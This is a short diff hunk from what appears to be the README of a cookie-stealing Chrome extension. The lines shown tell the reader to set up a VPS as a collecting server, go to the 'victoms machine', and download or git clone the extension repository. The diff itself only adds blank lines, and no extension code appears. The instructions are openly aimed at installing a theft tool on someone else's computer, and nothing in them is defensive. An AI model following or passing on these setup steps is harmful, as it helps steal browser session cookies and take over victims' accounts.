@@ -19,6 +19,8 @@ A - create VPS or any online server and open terminal
 B - go to your local computer or victoms machine / computer 
 
 1 - download zip file from https://github.com/fluxx03/cookie_Stealing_chrome_extention
+
+
     or clone using git `git clone https://github.com/fluxx03/cookie_Stealing_chrome_extention.git`
     
     
